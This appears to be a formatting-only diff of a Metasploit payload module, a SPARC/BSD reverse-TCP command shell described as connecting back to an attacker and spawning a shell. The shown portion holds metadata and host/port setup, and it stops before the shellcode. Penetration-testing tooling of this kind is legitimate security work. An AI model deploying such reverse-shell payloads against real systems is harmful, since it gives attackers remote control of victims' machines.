@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 128
 
   include Msf::Payload::Single
@@ -13,25 +11,28 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'BSD Command Shell, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        => 'vlad902',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'bsd',
-      'Arch'          => ARCH_SPARC,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'BSD Command Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and spawn a command shell',
+        'Author' => 'vlad902',
+        'License' => MSF_LICENSE,
+        'Platform' => 'bsd',
+        'Arch' => ARCH_SPARC,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell
+      )
+    )
   end
 
   def generate
-    port    = (datastore['RPORT'] || '0').to_i
-    host    = nil
+    port = (datastore['RPORT'] || '0').to_i
+    host = nil
     begin
-      host    = Rex::Socket.resolv_nbo_i(datastore['RHOST'] || '127.0.0.1')
+      host = Rex::Socket.resolv_nbo_i(datastore['RHOST'] || '127.0.0.1')
     rescue SocketError
-      host    = Rex::Socket.resolv_nbo_i('127.0.0.1')
+      host = Rex::Socket.resolv_nbo_i('127.0.0.1')
     end
 
     payload =
